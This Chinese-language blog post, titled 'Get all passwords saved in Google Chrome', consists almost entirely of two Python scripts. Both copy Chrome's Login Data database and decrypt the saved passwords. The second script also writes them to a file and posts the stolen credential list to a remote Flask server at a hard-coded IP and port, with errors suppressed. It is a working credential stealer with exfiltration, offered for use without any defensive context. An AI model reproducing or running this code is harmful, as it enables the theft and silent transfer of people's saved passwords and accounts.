  <h2 class="title">获取所有谷歌浏览器上保存的密码</h2>
  <p class="sub">Nov 9, 2019</p>
  <article class="content">
    <h1 id="简易版代码"><a href="#简易版代码" class="headerlink" title="简易版代码"></a>简易版代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : 王荣胜</span></span><br><span class="line"><span class="comment"># @Blog : https://sqdxwz.top</span></span><br><span class="line"><span class="comment"># @Date    : 2019/11/09 10:20</span></span><br><span class="line"><span class="comment"># Software : IDLE</span></span><br><span class="line"><span class="comment"># version：Python 3.6.6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> win32crypt</span><br><span class="line"></span><br><span class="line">db_file_path = os.path.join(os.environ[<span class="string">'LOCALAPPDATA'</span>], <span class="string">r'Google\Chrome\User Data\Default\Login Data'</span>)</span><br><span class="line"></span><br><span class="line">tmp_file = os.path.join(os.environ[<span class="string">'LOCALAPPDATA'</span>], <span class="string">'sqlite_file'</span>)</span><br><span class="line">print(tmp_file)</span><br><span class="line"><span class="keyword">if</span> os.path.exists(tmp_file):</span><br><span class="line">    os.remove(tmp_file)</span><br><span class="line">shutil.copyfile(db_file_path, tmp_file)</span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(tmp_file)</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(<span class="string">'select signon_realm,username_value,password_value from logins'</span>):</span><br><span class="line">    ret = win32crypt.CryptUnprotectData(row[<span class="number">2</span>], <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span>)</span><br><span class="line">    print(<span class="string">'网站：%-50s，用户名：%-20s，密码：%s'</span> % (row[<span class="number">0</span>][:<span class="number">50</span>], row[<span class="number">1</span>], ret[<span class="number">1</span>].decode(<span class="string">'gbk'</span>)))</span><br><span class="line"></span><br><span class="line">conn.close()</span><br><span class="line">os.remove(tmp_file)</span><br></pre></td></tr></table></figure>

<h1 id="完整进阶版代码"><a href="#完整进阶版代码" class="headerlink" title="完整进阶版代码"></a>完整进阶版代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : 王荣胜</span></span><br><span class="line"><span class="comment"># @Blog : https://sqdxwz.top</span></span><br><span class="line"><span class="comment"># @Date    : 2019/11/09 10:20</span></span><br><span class="line"><span class="comment"># Software : IDLE</span></span><br><span class="line"><span class="comment"># version：Python 3.6.6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> win32crypt</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH = os.environ[<span class="string">"LOCALAPPDATA"</span>]</span><br><span class="line">DB_PATH = <span class="string">r'Google\Chrome\User Data\Default\Login Data'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChromePassword</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.passwordsList = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_chrome_db</span><span class="params">(self)</span>:</span></span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)</span><br><span class="line">        _tmp_file = os.path.join(os.environ[<span class="string">'LOCALAPPDATA'</span>], <span class="string">'sqlite_file'</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(_tmp_file):</span><br><span class="line">            os.remove(_tmp_file)</span><br><span class="line">        shutil.copyfile(_full_path, _tmp_file)</span><br><span class="line">        self.show_passwords(_tmp_file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_passwords</span><span class="params">(self, db_file)</span>:</span></span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="string">'''select signon_realm,username_value,password_value from logins'''</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(_sql):</span><br><span class="line">            ret = win32crypt.CryptUnprotectData(row[<span class="number">2</span>], <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="comment"># 密码解析后得到的是字节码，需要进行解码操作</span></span><br><span class="line">            _info = <span class="string">'url: %-40s username: %-20s password: %s\n'</span> % \</span><br><span class="line">                    (row[<span class="number">0</span>][:<span class="number">50</span>], row[<span class="number">1</span>], ret[<span class="number">1</span>].decode())</span><br><span class="line">            self.passwordsList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_passwords</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'password.txt'</span>, <span class="string">'w'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(self.passwordsList)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">transfer_passwords</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 此处填写远端Flask对应的IP:PORT</span></span><br><span class="line">            requests.post(<span class="string">'http://192.168.1.102:9999/index'</span>,</span><br><span class="line">                          data=json.dumps(self.passwordsList))</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br><span class="line">    Main.transfer_passwords()</span><br></pre></td></tr></table></figure>
